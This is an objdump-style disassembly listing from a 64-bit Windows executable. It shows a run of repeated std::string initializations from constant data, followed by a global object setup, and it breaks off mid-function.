   1400043f6:	90                   	nop
   1400043f7:	48 8d 4d 50          	lea    0x50(%rbp),%rcx
   1400043fb:	e8 c0 71 00 00       	call   0x14000b5c0
   140004400:	48 c7 45 68 0f 00 00 	movq   $0xf,0x68(%rbp)
   140004407:	00 
   140004408:	48 89 5d 60          	mov    %rbx,0x60(%rbp)
   14000440c:	88 5d 50             	mov    %bl,0x50(%rbp)
   14000440f:	44 8d 43 0a          	lea    0xa(%rbx),%r8d
   140004413:	48 8d 15 86 c1 02 00 	lea    0x2c186(%rip),%rdx        # 0x1400305a0
   14000441a:	48 8d 4d 50          	lea    0x50(%rbp),%rcx
   14000441e:	e8 bd 12 00 00       	call   0x1400056e0
   140004423:	90                   	nop
   140004424:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140004428:	e8 93 71 00 00       	call   0x14000b5c0
   14000442d:	48 c7 85 88 00 00 00 	movq   $0xf,0x88(%rbp)
   140004434:	0f 00 00 00 
   140004438:	48 89 9d 80 00 00 00 	mov    %rbx,0x80(%rbp)
   14000443f:	88 5d 70             	mov    %bl,0x70(%rbp)
   140004442:	44 8d 43 07          	lea    0x7(%rbx),%r8d
   140004446:	48 8d 15 63 c1 02 00 	lea    0x2c163(%rip),%rdx        # 0x1400305b0
   14000444d:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140004451:	e8 8a 12 00 00       	call   0x1400056e0
   140004456:	90                   	nop
   140004457:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   14000445e:	e8 5d 71 00 00       	call   0x14000b5c0
   140004463:	48 c7 85 a8 00 00 00 	movq   $0xf,0xa8(%rbp)
   14000446a:	0f 00 00 00 
   14000446e:	48 89 9d a0 00 00 00 	mov    %rbx,0xa0(%rbp)
   140004475:	88 9d 90 00 00 00    	mov    %bl,0x90(%rbp)
   14000447b:	44 8d 43 0c          	lea    0xc(%rbx),%r8d
   14000447f:	48 8d 15 32 c1 02 00 	lea    0x2c132(%rip),%rdx        # 0x1400305b8
   140004486:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   14000448d:	e8 4e 12 00 00       	call   0x1400056e0
   140004492:	90                   	nop
   140004493:	48 8d 8d b0 00 00 00 	lea    0xb0(%rbp),%rcx
   14000449a:	e8 21 71 00 00       	call   0x14000b5c0
   14000449f:	48 c7 85 c8 00 00 00 	movq   $0xf,0xc8(%rbp)
   1400044a6:	0f 00 00 00 
   1400044aa:	48 89 9d c0 00 00 00 	mov    %rbx,0xc0(%rbp)
   1400044b1:	88 9d b0 00 00 00    	mov    %bl,0xb0(%rbp)
   1400044b7:	44 8d 43 08          	lea    0x8(%rbx),%r8d
   1400044bb:	48 8d 15 06 c1 02 00 	lea    0x2c106(%rip),%rdx        # 0x1400305c8
   1400044c2:	48 8d 8d b0 00 00 00 	lea    0xb0(%rbp),%rcx
   1400044c9:	e8 12 12 00 00       	call   0x1400056e0
   1400044ce:	90                   	nop
   1400044cf:	48 8d 8d d0 00 00 00 	lea    0xd0(%rbp),%rcx
   1400044d6:	e8 e5 70 00 00       	call   0x14000b5c0
   1400044db:	48 c7 85 e8 00 00 00 	movq   $0xf,0xe8(%rbp)
   1400044e2:	0f 00 00 00 
   1400044e6:	48 89 9d e0 00 00 00 	mov    %rbx,0xe0(%rbp)
   1400044ed:	88 9d d0 00 00 00    	mov    %bl,0xd0(%rbp)
   1400044f3:	44 8d 43 12          	lea    0x12(%rbx),%r8d
   1400044f7:	48 8d 15 da c0 02 00 	lea    0x2c0da(%rip),%rdx        # 0x1400305d8
   1400044fe:	48 8d 8d d0 00 00 00 	lea    0xd0(%rbp),%rcx
   140004505:	e8 d6 11 00 00       	call   0x1400056e0
   14000450a:	90                   	nop
   14000450b:	48 8d 8d f0 00 00 00 	lea    0xf0(%rbp),%rcx
   140004512:	e8 a9 70 00 00       	call   0x14000b5c0
   140004517:	48 c7 85 08 01 00 00 	movq   $0xf,0x108(%rbp)
   14000451e:	0f 00 00 00 
   140004522:	48 89 9d 00 01 00 00 	mov    %rbx,0x100(%rbp)
   140004529:	88 9d f0 00 00 00    	mov    %bl,0xf0(%rbp)
   14000452f:	44 8d 43 12          	lea    0x12(%rbx),%r8d
   140004533:	48 8d 15 b6 c0 02 00 	lea    0x2c0b6(%rip),%rdx        # 0x1400305f0
   14000453a:	48 8d 8d f0 00 00 00 	lea    0xf0(%rbp),%rcx
   140004541:	e8 9a 11 00 00       	call   0x1400056e0
   140004546:	90                   	nop
   140004547:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   14000454e:	e8 6d 70 00 00       	call   0x14000b5c0
   140004553:	48 c7 85 28 01 00 00 	movq   $0xf,0x128(%rbp)
   14000455a:	0f 00 00 00 
   14000455e:	48 89 9d 20 01 00 00 	mov    %rbx,0x120(%rbp)
   140004565:	88 9d 10 01 00 00    	mov    %bl,0x110(%rbp)
   14000456b:	44 8d 43 1a          	lea    0x1a(%rbx),%r8d
   14000456f:	48 8d 15 92 c0 02 00 	lea    0x2c092(%rip),%rdx        # 0x140030608
   140004576:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   14000457d:	e8 5e 11 00 00       	call   0x1400056e0
   140004582:	90                   	nop
   140004583:	48 8d 8d 30 01 00 00 	lea    0x130(%rbp),%rcx
   14000458a:	e8 31 70 00 00       	call   0x14000b5c0
   14000458f:	48 c7 85 48 01 00 00 	movq   $0xf,0x148(%rbp)
   140004596:	0f 00 00 00 
   14000459a:	48 89 9d 40 01 00 00 	mov    %rbx,0x140(%rbp)
   1400045a1:	88 9d 30 01 00 00    	mov    %bl,0x130(%rbp)
   1400045a7:	44 8d 43 20          	lea    0x20(%rbx),%r8d
   1400045ab:	48 8d 15 76 c0 02 00 	lea    0x2c076(%rip),%rdx        # 0x140030628
   1400045b2:	48 8d 8d 30 01 00 00 	lea    0x130(%rbp),%rcx
   1400045b9:	e8 22 11 00 00       	call   0x1400056e0
   1400045be:	90                   	nop
   1400045bf:	48 8d 8d 50 01 00 00 	lea    0x150(%rbp),%rcx
   1400045c6:	e8 f5 6f 00 00       	call   0x14000b5c0
   1400045cb:	48 c7 85 68 01 00 00 	movq   $0xf,0x168(%rbp)
   1400045d2:	0f 00 00 00 
   1400045d6:	48 89 9d 60 01 00 00 	mov    %rbx,0x160(%rbp)
   1400045dd:	88 9d 50 01 00 00    	mov    %bl,0x150(%rbp)
   1400045e3:	44 8d 43 1a          	lea    0x1a(%rbx),%r8d
   1400045e7:	48 8d 15 62 c0 02 00 	lea    0x2c062(%rip),%rdx        # 0x140030650
   1400045ee:	48 8d 8d 50 01 00 00 	lea    0x150(%rbp),%rcx
   1400045f5:	e8 e6 10 00 00       	call   0x1400056e0
   1400045fa:	90                   	nop
   1400045fb:	48 8d 8d 70 01 00 00 	lea    0x170(%rbp),%rcx
   140004602:	e8 b9 6f 00 00       	call   0x14000b5c0
   140004607:	48 c7 85 88 01 00 00 	movq   $0xf,0x188(%rbp)
   14000460e:	0f 00 00 00 
   140004612:	48 89 9d 80 01 00 00 	mov    %rbx,0x180(%rbp)
   140004619:	88 9d 70 01 00 00    	mov    %bl,0x170(%rbp)
   14000461f:	44 8d 43 14          	lea    0x14(%rbx),%r8d
   140004623:	48 8d 15 46 c0 02 00 	lea    0x2c046(%rip),%rdx        # 0x140030670
   14000462a:	48 8d 8d 70 01 00 00 	lea    0x170(%rbp),%rcx
   140004631:	e8 aa 10 00 00       	call   0x1400056e0
   140004636:	90                   	nop
   140004637:	48 8d 8d 90 01 00 00 	lea    0x190(%rbp),%rcx
   14000463e:	e8 7d 6f 00 00       	call   0x14000b5c0
   140004643:	48 c7 85 a8 01 00 00 	movq   $0xf,0x1a8(%rbp)
   14000464a:	0f 00 00 00 
   14000464e:	48 89 9d a0 01 00 00 	mov    %rbx,0x1a0(%rbp)
   140004655:	88 9d 90 01 00 00    	mov    %bl,0x190(%rbp)
   14000465b:	44 8d 43 14          	lea    0x14(%rbx),%r8d
   14000465f:	48 8d 15 22 c0 02 00 	lea    0x2c022(%rip),%rdx        # 0x140030688
   140004666:	48 8d 8d 90 01 00 00 	lea    0x190(%rbp),%rcx
   14000466d:	e8 6e 10 00 00       	call   0x1400056e0
   140004672:	90                   	nop
   140004673:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   14000467a:	e8 41 6f 00 00       	call   0x14000b5c0
   14000467f:	48 c7 85 c8 01 00 00 	movq   $0xf,0x1c8(%rbp)
   140004686:	0f 00 00 00 
   14000468a:	48 89 9d c0 01 00 00 	mov    %rbx,0x1c0(%rbp)
   140004691:	88 9d b0 01 00 00    	mov    %bl,0x1b0(%rbp)
   140004697:	44 8d 43 1d          	lea    0x1d(%rbx),%r8d
   14000469b:	48 8d 15 fe bf 02 00 	lea    0x2bffe(%rip),%rdx        # 0x1400306a0
   1400046a2:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   1400046a9:	e8 32 10 00 00       	call   0x1400056e0
   1400046ae:	90                   	nop
   1400046af:	48 8d 8d d0 01 00 00 	lea    0x1d0(%rbp),%rcx
   1400046b6:	e8 05 6f 00 00       	call   0x14000b5c0
   1400046bb:	48 c7 85 e8 01 00 00 	movq   $0xf,0x1e8(%rbp)
   1400046c2:	0f 00 00 00 
   1400046c6:	48 89 9d e0 01 00 00 	mov    %rbx,0x1e0(%rbp)
   1400046cd:	88 9d d0 01 00 00    	mov    %bl,0x1d0(%rbp)
   1400046d3:	44 8d 43 13          	lea    0x13(%rbx),%r8d
   1400046d7:	48 8d 15 e2 bf 02 00 	lea    0x2bfe2(%rip),%rdx        # 0x1400306c0
   1400046de:	48 8d 8d d0 01 00 00 	lea    0x1d0(%rbp),%rcx
   1400046e5:	e8 f6 0f 00 00       	call   0x1400056e0
   1400046ea:	90                   	nop
   1400046eb:	48 8d 8d f0 01 00 00 	lea    0x1f0(%rbp),%rcx
   1400046f2:	e8 c9 6e 00 00       	call   0x14000b5c0
   1400046f7:	48 c7 85 08 02 00 00 	movq   $0xf,0x208(%rbp)
   1400046fe:	0f 00 00 00 
   140004702:	48 89 9d 00 02 00 00 	mov    %rbx,0x200(%rbp)
   140004709:	88 9d f0 01 00 00    	mov    %bl,0x1f0(%rbp)
   14000470f:	44 8d 43 13          	lea    0x13(%rbx),%r8d
   140004713:	48 8d 15 be bf 02 00 	lea    0x2bfbe(%rip),%rdx        # 0x1400306d8
   14000471a:	48 8d 8d f0 01 00 00 	lea    0x1f0(%rbp),%rcx
   140004721:	e8 ba 0f 00 00       	call   0x1400056e0
   140004726:	90                   	nop
   140004727:	48 8d 8d 10 02 00 00 	lea    0x210(%rbp),%rcx
   14000472e:	e8 8d 6e 00 00       	call   0x14000b5c0
   140004733:	48 c7 85 28 02 00 00 	movq   $0xf,0x228(%rbp)
   14000473a:	0f 00 00 00 
   14000473e:	48 89 9d 20 02 00 00 	mov    %rbx,0x220(%rbp)
   140004745:	88 9d 10 02 00 00    	mov    %bl,0x210(%rbp)
   14000474b:	44 8d 43 0f          	lea    0xf(%rbx),%r8d
   14000474f:	48 8d 15 9a bf 02 00 	lea    0x2bf9a(%rip),%rdx        # 0x1400306f0
   140004756:	48 8d 8d 10 02 00 00 	lea    0x210(%rbp),%rcx
   14000475d:	e8 7e 0f 00 00       	call   0x1400056e0
   140004762:	90                   	nop
   140004763:	48 8d 8d 30 02 00 00 	lea    0x230(%rbp),%rcx
   14000476a:	e8 51 6e 00 00       	call   0x14000b5c0
   14000476f:	48 c7 85 48 02 00 00 	movq   $0xf,0x248(%rbp)
   140004776:	0f 00 00 00 
   14000477a:	48 89 9d 40 02 00 00 	mov    %rbx,0x240(%rbp)
   140004781:	88 9d 30 02 00 00    	mov    %bl,0x230(%rbp)
   140004787:	44 8d 43 19          	lea    0x19(%rbx),%r8d
   14000478b:	48 8d 15 6e bf 02 00 	lea    0x2bf6e(%rip),%rdx        # 0x140030700
   140004792:	48 8d 8d 30 02 00 00 	lea    0x230(%rbp),%rcx
   140004799:	e8 42 0f 00 00       	call   0x1400056e0
   14000479e:	90                   	nop
   14000479f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400047a4:	48 8d 0d bd 4b 04 00 	lea    0x44bbd(%rip),%rcx        # 0x140049368
   1400047ab:	e8 10 6e 00 00       	call   0x14000b5c0
   1400047b0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400047b3:	f3 0f 7f 05 ad 4b 04 	movdqu %xmm0,0x44bad(%rip)        # 0x140049368
   1400047ba:	00 
   1400047bb:	48 89 1d b6 4b 04 00 	mov    %rbx,0x44bb6(%rip)        # 0x140049378
   1400047c2:	33 c0                	xor    %eax,%eax
   1400047c4:	44 0f b6 c8          	movzbl %al,%r9d
